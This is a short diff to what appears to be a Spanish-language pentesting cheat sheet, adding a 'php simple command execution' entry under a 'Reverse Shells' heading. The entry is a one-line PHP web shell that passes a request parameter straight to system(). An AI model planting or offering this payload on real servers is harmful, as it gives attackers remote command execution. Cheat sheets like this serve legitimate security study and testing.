@@ -189,6 +189,20 @@ tcpdump -i eth0 icmp
 
 <h2>⭐️Reverse Shells </h2>
 
+## php simple command execution
+
+
+```
+
+<?php
+
+system($_REQUEST['cmd']);
+?>
+
+
+``` 
+
+
 Conección simple 
 
 ```bash
